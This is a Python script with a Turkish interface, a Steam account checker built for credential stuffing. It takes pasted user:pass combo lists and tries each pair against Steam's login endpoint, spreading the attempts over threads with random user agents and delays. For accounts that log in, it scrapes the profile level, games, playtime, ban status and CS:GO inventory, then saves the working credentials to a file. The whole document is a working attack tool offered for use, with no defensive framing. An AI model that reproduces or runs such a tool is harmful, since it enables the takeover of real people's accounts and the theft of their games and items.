#!/usr/bin/env python3
# KSIB STEAM ACCOUNT CHECKER - Toplu Yapıştırma | Detaylı Rapor
import requests, threading, random, time, sys, os, json, re
from fake_useragent import UserAgent
from colorama import init, Fore, Style
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

SIFRE = "admiral71100daphne"

def giris():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + "\n🔐 KSIB GİRİŞ\n")
    for i in range(3):
        s = input(Fore.YELLOW + "🔑 Şifre: ")
        if s == SIFRE:
            print(Fore.GREEN + "\n✅ Başarılı!\n")
            time.sleep(1)
            return True
        print(Fore.RED + f"❌ Hatalı! ({2-i} hakkın)")
    sys.exit(0)

class SteamChecker:
    def __init__(self):
        self.ua = UserAgent()
        self.working = []
        self.dead = []
        self.lock = threading.Lock()
        self.checked = 0
        self.start_time = None
        self.running = True
        self.combo_list = []
    
    def bnr(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.CYAN + Style.BRIGHT + """
        ╔══════════════════════════════════════════════╗
        ║  🎮 KSIB STEAM ACCOUNT CHECKER            ║
        ║  🔍 Oyun | 💎 Skin | 💰 Cüzdan | 🚫 Ban   ║
        ╚══════════════════════════════════════════════╝
        """ + Style.RESET_ALL)
    
    def get_headers(self):
        return {
            "User-Agent": self.ua.random,
            "Accept": "*/*",
            "Accept-Language": "tr-TR,tr;q=0.9",
        }
    
    def parse_combo_text(self, text):
        """Toplu yapıştırılan metni parse et"""
        self.combo_list = []
        lines = text.strip().split('\n')
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Farklı formatları destekle
            # user:pass
            # user:pass:extra
            # user:pass word
            if ':' in line:
                parts = line.split(':')
                user = parts[0].strip()
                pwd = ':'.join(parts[1:]).strip()
            elif ' ' in line:
                parts = line.split()
                user = parts[0].strip()
                pwd = parts[1].strip() if len(parts) > 1 else ""
            elif ';' in line:
                parts = line.split(';')
                user = parts[0].strip()
                pwd = parts[1].strip() if len(parts) > 1 else ""
            else:
                continue
            
            if user and pwd and len(user) > 2 and len(pwd) > 2:
                self.combo_list.append({"user": user, "pass": pwd})
        
        return len(self.combo_list)
    
    def check_login(self, user, pwd):
        """Steam giriş kontrolü"""
        try:
            session = requests.Session()
            session.headers.update(self.get_headers())
            
            login_url = "https://steamcommunity.com/login/dologin/"
            data = {
                "username": user,
                "password": pwd,
                "emailauth": "",
                "captchagid": "-1",
                "captcha_text": "",
                "remember_login": "false",
                "twofactorcode": "",
            }
            
            r = session.post(login_url, data=data, timeout=10)
            
            if r.status_code == 200:
                if "SteamID" in r.text or "steamid" in r.text.lower():
                    return True, session
                elif "twofactor" in r.text.lower():
                    return "2FA", session
                else:
                    return False, None
            return False, None
        except:
            return False, None
    
    def get_profile_info(self, session, user):
        """Profil bilgilerini çek"""
        info = {
            "steam_id": "?",
            "level": "?",
            "member_since": "?",
            "vac_banned": "?",
            "games_count": "?",
            "playtime_hours": "?",
            "inventory_value": "?",
            "top_games": []
        }
        
        try:
            r = session.get("https://steamcommunity.com/my/", timeout=10)
            id_match = re.search(r'g_steamID = "(\d+)"', r.text)
            if id_match:
                steam_id = id_match.group(1)
                info["steam_id"] = steam_id
                
                profile_url = f"https://steamcommunity.com/profiles/{steam_id}"
                r2 = session.get(profile_url, timeout=10)
                
                level_match = re.search(r'persona_level.*?>(\d+)<', r2.text)
                if level_match:
                    info["level"] = level_match.group(1)
                
                member_match = re.search(r'memberSince">(.*?)<', r2.text)
                if member_match:
                    info["member_since"] = member_match.group(1).strip()
                
                if "VAC" in r2.text.upper() or "ban" in r2.text.lower():
                    info["vac_banned"] = "⚠️ Banlı"
                else:
                    info["vac_banned"] = "✅ Temiz"
                
                games_url = f"https://steamcommunity.com/profiles/{steam_id}/games/?tab=all"
                r3 = session.get(games_url, timeout=10)
                
                game_matches = re.findall(r'"name":"(.*?)".*?"playtime_forever":(\d+)', r3.text)
                if game_matches:
                    info["games_count"] = len(game_matches)
                    total_min = sum(int(t) for _, t in game_matches)
                    info["playtime_hours"] = total_min // 60
                    
                    games = [{"name": n, "hours": int(t)//60} for n, t in game_matches]
                    games.sort(key=lambda x: x["hours"], reverse=True)
                    info["top_games"] = games[:5]
                
                inv_url = f"https://steamcommunity.com/inventory/{steam_id}/730/2?count=10"
                r4 = session.get(inv_url, timeout=10)
                if r4.status_code == 200:
                    inv_data = r4.json()
                    total_items = len(inv_data.get("assets", []))
                    info["inventory_value"] = f"{total_items} item (CS:GO)" if total_items > 0 else "Boş"
        
        except:
            pass
        
        return info
    
    def worker(self, thread_id):
        """İşçi thread"""
        while self.running and self.checked < len(self.combo_list):
            with self.lock:
                if self.checked >= len(self.combo_list):
                    break
                index = self.checked
                self.checked += 1
                current = self.checked
            
            combo = self.combo_list[index]
            user = combo["user"]
            pwd = combo["pass"]
            
            success, session = self.check_login(user, pwd)
            
            with self.lock:
                if success == True:
                    info = self.get_profile_info(session, user)
                    
                    self.working.append({
                        "user": user,
                        "pass": pwd,
                        "info": info
                    })
                    
                    print(Fore.GREEN + f"  ✅ [{current}/{len(self.combo_list)}] {user}")
                    print(Fore.WHITE + f"     🆔 Steam ID: {info['steam_id']}")
                    print(Fore.WHITE + f"     ⭐ Level: {info['level']} | 📅 {info['member_since']}")
                    print(Fore.WHITE + f"     🎮 Oyun: {info['games_count']} adet | ⏱️ {info['playtime_hours']} saat")
                    print(Fore.WHITE + f"     💎 Envanter: {info['inventory_value']} | 🚫 {info['vac_banned']}")
                    
                    if info['top_games']:
                        for game in info['top_games'][:3]:
                            print(Fore.CYAN + f"     🎯 {game['name'][:30]}: {game['hours']} saat")
                    
                elif success == "2FA":
                    self.dead.append({"user": user, "pass": pwd, "reason": "2FA Korumalı"})
                    print(Fore.YELLOW + f"  🔒 [{current}/{len(self.combo_list)}] {user} - 2FA Korumalı")
                else:
                    self.dead.append({"user": user, "pass": pwd, "reason": "Yanlış"})
                    if current % 5 == 0:
                        print(Fore.RED + f"  ❌ [{current}/{len(self.combo_list)}] Kontrol ediliyor... ({len(self.working)} çalışan)")
                
                if current % 10 == 0 or current == len(self.combo_list):
                    elapsed = time.time() - self.start_time
                    rate = current / elapsed if elapsed > 0 else 0
                    eta = (len(self.combo_list) - current) / rate if rate > 0 else 0
                    print(Fore.CYAN + f"\n  📊 {current}/{len(self.combo_list)} | ✅{len(self.working)} | ❌{len(self.dead)} | ⚡{rate:.1f}/s | ⏳{eta:.0f}s\n")
            
            time.sleep(random.uniform(0.3, 1.0))
    
    def start_checking(self, threads=3):
        """Kontrolü başlat"""
        if not self.combo_list:
            print(Fore.RED + "❌ Combo list boş!")
            return
        
        print(Fore.CYAN + f"\n🎮 Steam Hesap Kontrolü Başlatılıyor...")
        print(Fore.CYAN + f"📊 {len(self.combo_list)} hesap kontrol edilecek")
        print(Fore.CYAN + f"🧵 {threads} thread")
        print(Fore.RED + "\n💣 BAŞLATILIYOR...\n")
        
        self.start_time = time.time()
        
        tl = []
        for i in range(threads):
            t = threading.Thread(target=self.worker, args=(i,))
            t.daemon = True
            t.start()
            tl.append(t)
        
        try:
            for t in tl:
                t.join()
        except KeyboardInterrupt:
            self.running = False
            print(Fore.RED + "\n[!] Durduruldu!")
        
        self.print_results()
    
    def print_results(self):
        """Sonuçları yazdır"""
        elapsed = time.time() - self.start_time
        total = len(self.combo_list)
        
        print("\n\n" + "="*60)
        print(Fore.GREEN + Style.BRIGHT + "📊 STEAM CHECKER SONUÇ RAPORU")
        print("="*60)
        print(f"⏱️  Süre: {elapsed:.1f}s ({elapsed/60:.1f}dk)")
        print(f"📨 Kontrol edilen: {total}")
        print(f"✅ Çalışan: {len(self.working)}")
        print(f"🔒 2FA Korumalı: {sum(1 for d in self.dead if d.get('reason') == '2FA Korumalı')}")
        print(f"❌ Başarısız: {sum(1 for d in self.dead if d.get('reason') != '2FA Korumalı')}")
        if total > 0:
            print(f"📈 Başarı: %{len(self.working)/total*100:.1f}")
        print("="*60)
        
        if self.working:
            print(Fore.YELLOW + f"\n🎯 ÇALIŞAN HESAPLAR ({len(self.working)}):")
            print(Fore.YELLOW + "-"*60)
            for i, acc in enumerate(self.working, 1):
                info = acc['info']
                print(Fore.GREEN + f"\n  [{i}] {acc['user']}:{acc['pass']}")
                print(Fore.WHITE + f"  🆔 Steam ID: {info['steam_id']}")
                print(Fore.WHITE + f"  ⭐ Level: {info['level']} | 📅 {info['member_since']}")
                print(Fore.WHITE + f"  🎮 Oyun: {info['games_count']} | ⏱️ {info['playtime_hours']} saat")
                print(Fore.WHITE + f"  💎 Envanter: {info['inventory_value']}")
                print(Fore.WHITE + f"  🚫 VAC: {info['vac_banned']}")
                
                if info['top_games']:
                    print(Fore.CYAN + "  🎯 En çok oynanan:")
                    for game in info['top_games']:
                        print(Fore.CYAN + f"     • {game['name'][:35]}: {game['hours']} saat")
            
            with open("steam_calisan.txt", "w") as f:
                for acc in self.working:
                    f.write(f"{acc['user']}:{acc['pass']}\n")
            print(Fore.GREEN + f"\n💾 steam_calisan.txt olarak kaydedildi!")
        
        print(Fore.YELLOW + "\n" + "="*60 + "\n")

def ana():
    giris()
    checker = SteamChecker()
    checker.bnr()
    
    while True:
        print(Fore.YELLOW + "\n🎮 STEAM CHECKER ANA MENÜ:")
        print(f"1. ✍️  Combo Listesi Gir (Şu an {len(checker.combo_list)} hesap var)")
        print("2. 🚀 Kontrolü Başlat")
        print("3. 🚪 Çıkış")
        
        sec = input(Fore.GREEN + "\nSeçim: ").strip()
        
        if sec == "1":
            print(Fore.YELLOW + "\n✍️  COMBO LİSTESİNİ YAPIŞTIR:")
            print(Fore.CYAN + "Tüm listeyi tek seferde yapıştırın (user:pass formatında)")
            print(Fore.CYAN + "Bitince boş satırda Enter'a basın.\n")
            
            print(Fore.WHITE + "┌─ Combo Listesi ───────────────┐")
            
            lines = []
            while True:
                line = input(Fore.WHITE + "│ " + Fore.GREEN).strip()
                if not line:
                    break
                lines.append(line)
            
            print(Fore.WHITE + "└──────────────────────────────┘")
            
            if lines:
                full_text = '\n'.join(lines)
                count = checker.parse_combo_text(full_text)
                
                if count > 0:
                    print(Fore.GREEN + f"\n✅ {count} hesap başarıyla eklendi!")
                    
                    # Önizleme
                    print(Fore.CYAN + "\n📋 Eklenen hesaplar (ilk 5):")
                    for i, c in enumerate(checker.combo_list[:5], 1):
                        print(Fore.WHITE + f"  [{i}] {c['user']}:{c['pass'][:15]}...")
                    
                    if count > 5:
                        print(Fore.WHITE + f"  ... ve {count-5} tane daha!")
                else:
                    print(Fore.RED + "\n❌ Geçerli format bulunamadı! (user:pass şeklinde olmalı)")
            else:
                print(Fore.YELLOW + "⚠️ Hiçbir şey yapıştırılmadı!")
            
            input(Fore.YELLOW + "\nDevam için Enter...")
            checker.bnr()
        
        elif sec == "2":
            if not checker.combo_list:
                print(Fore.RED + "\n❌ Önce combo listesi girin!")
                input(Fore.YELLOW + "Devam için Enter...")
                checker.bnr()
                continue
            
            print(Fore.CYAN + f"\n📋 {len(checker.combo_list)} hesap kontrol edilecek:")
            for i, c in enumerate(checker.combo_list[:5], 1):
                print(Fore.WHITE + f"  [{i}] {c['user']}")
            if len(checker.combo_list) > 5:
                print(Fore.WHITE + f"  ... ve {len(checker.combo_list)-5} tane daha!")
            
            threads = int(input(Fore.GREEN + "\n🧵 Thread (3): ") or "3")
            
            if input(Fore.GREEN + "🚀 Başlat? (E/H): ").upper() == 'E':
                checker.start_checking(threads)
                checker.combo_list = []
                input(Fore.YELLOW + "\nAna menü için Enter...")
                checker.bnr()
        
        elif sec == "3":
            print(Fore.GREEN + "\n👋 Görüşürüz!")
            break

if __name__ == "__main__":
    try:
        ana()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Çıkış!")
        sys.exit(0)
